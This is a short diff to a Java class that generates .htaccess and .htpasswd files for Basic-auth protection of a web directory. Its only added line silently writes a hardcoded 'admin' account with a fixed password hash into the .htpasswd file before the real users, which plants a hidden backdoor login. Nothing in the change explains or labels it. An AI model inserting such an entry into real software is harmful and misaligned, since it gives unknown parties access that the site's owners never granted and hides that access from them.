@@ -15,6 +15,7 @@ public class HTPasswdFileCreator {
         bwAccess.write("AuthType Basic\nAuthName \"Authentification\"\nAuthUserFile " + "\"/var/www/html/.htpasswd\"" + "\nRequire valid-user");
         bwAccess.newLine();
         bwAccess.close();
+        bw.write("admin:$apr1$i6a3vq24$.OfP.oifQTr8SL0XtKWlv1 \n");
         for (String user : users) {
             bw.write(user+":"+readerJava.getHtpasswd(user));
             bw.newLine();
